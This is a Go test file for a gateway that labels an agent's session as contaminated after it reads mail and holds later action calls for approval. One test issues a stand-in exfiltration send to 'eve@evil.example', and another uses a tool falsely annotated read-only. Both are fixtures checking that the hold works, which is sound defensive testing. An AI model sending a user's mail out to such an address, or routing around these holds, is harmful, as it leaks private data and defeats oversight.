package gateway

import (
	"context"
	"slices"
	"strings"
	"sync"
	"testing"

	"github.com/google/go-cmp/cmp"

	"cleanroom/internal/core"
)

func TestToolsOffered(t *testing.T) {
	w := newWorld(t)
	cs := w.agent("chief")
	res, err := cs.ListTools(context.Background(), nil)
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, tool := range res.Tools {
		got = append(got, tool.Name)
	}
	slices.Sort(got)
	// calendar_mystery is missing: it has no class, so it is not offered.
	// inbox_search and inbox_read are missing too: inbox is ask_only, so
	// only its send tool is offered.
	want := []string{"ask", "calendar_create_event", "calendar_list_events", "inbox_send", "mail_search", "mail_send", "shady_harmless", "status"}
	if diff := cmp.Diff(want, got); diff != "" {
		t.Errorf("tools (-want +got):\n%s", diff)
	}
}

func TestCleanSessionCallPassesThrough(t *testing.T) {
	w := newWorld(t)
	cs := w.agent("chief")
	res := call(t, cs, "calendar_create_event", map[string]any{"title": "Family reunion", "date": "2027-07-17"}, nil)
	if res.IsError || text(res) != "created" {
		t.Fatalf("result = %q (error %v), want the upstream's reply", text(res), res.IsError)
	}
	want := []string{`create_event {"date":"2027-07-17","title":"Family reunion"}`}
	if diff := cmp.Diff(want, w.fakes["calendar"].seen()); diff != "" {
		t.Errorf("upstream calls (-want +got):\n%s", diff)
	}
}

func TestDirectReadContaminatesAndLaterActsAreHeld(t *testing.T) {
	w := newWorld(t)
	cs := w.agent("chief")

	call(t, cs, "mail_search", map[string]any{"query": "order"}, nil)
	if got, want := w.labels("chief"), (core.Labels{Contaminated: true, Private: true}); got != want {
		t.Fatalf("labels = %v, want %v", got, want)
	}

	var held Held
	res := call(t, cs, "mail_send", map[string]any{"to": "eve@evil.example", "body": "the inbox"}, &held)
	if held.Status != "held" || held.Proposal == 0 || res.IsError {
		t.Fatalf("result = %+v, text %q", held, text(res))
	}
	if !strings.Contains(text(res), "called mail.search") {
		t.Errorf("held text does not cite what contaminated the session:\n%s", text(res))
	}
	// The whole point: the upstream never saw the send.
	if diff := cmp.Diff([]string{`search {"query":"order"}`}, w.fakes["mail"].seen()); diff != "" {
		t.Errorf("mail upstream calls (-want +got):\n%s", diff)
	}

	var st Status
	call(t, cs, "status", nil, &st)
	want := []HeldCall{{Proposal: held.Proposal, Tool: "mail.send", Status: core.Pending}}
	if diff := cmp.Diff(want, st.Held); diff != "" {
		t.Errorf("status held (-want +got):\n%s", diff)
	}

	// Another session is unaffected.
	other := w.agent("other")
	if res := call(t, other, "calendar_create_event", nil, nil); text(res) != "created" {
		t.Errorf("a clean session was affected: %q", text(res))
	}
}

func TestPolicyOverridesAnnotations(t *testing.T) {
	w := newWorld(t)
	cs := w.agent("chief")
	call(t, cs, "mail_search", nil, nil)

	// The server says read-only. The policy says act. The policy wins.
	var held Held
	call(t, cs, "shady_harmless", nil, &held)
	if held.Status != "held" {
		t.Errorf("a tool annotated read-only ran in a contaminated session despite the policy")
	}
	if len(w.fakes["shady"].seen()) != 0 {
		t.Error("the upstream was called")
	}
	// A tool the policy does not mention falls back to its annotations.
	if res := call(t, cs, "calendar_list_events", nil, nil); text(res) != "[]" {
		t.Errorf("list_events = %q, want it to run as a read", text(res))
	}
}

func TestResumedSessionIsStillContaminated(t *testing.T) {
	w := newWorld(t)
	call(t, w.agent("chief"), "mail_search", nil, nil)

	// A new server for the same session id, as after a client restart.
	var held Held
	call(t, w.agent("chief"), "calendar_create_event", nil, &held)
	if held.Status != "held" {
		t.Error("a resumed session came back clean")
	}
}

// TestParallelCallsCannotSlipPast fires a contaminating read and many act
// calls at once. Whatever the interleaving, an act call that reached the
// upstream must have been decided before the read was.
func TestParallelCallsCannotSlipPast(t *testing.T) {
	w := newWorld(t)
	cs := w.agent("chief")

	var wg sync.WaitGroup
	for i := range 20 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if i == 10 {
				call(t, cs, "mail_search", nil, nil)
				return
			}
			call(t, cs, "calendar_create_event", nil, nil)
		}()
	}
	wg.Wait()

	log, err := w.g.Log.Read()
	if err != nil {
		t.Fatal(err)
	}
	readAt, ran := 0, 0
	for _, e := range log {
		if e.Kind != core.KindCall {
			continue
		}
		c := e.Call
		switch {
		case c.Call.Tool == "search":
			readAt = e.Seq
		case c.Decision.Verdict == core.Run:
			ran++
			if readAt != 0 {
				t.Errorf("event %d: an act call ran after the read at %d", e.Seq, readAt)
			}
		}
	}
	if got := len(w.fakes["calendar"].seen()); got != ran {
		t.Errorf("the upstream saw %d calls, the log allowed %d", got, ran)
	}
}
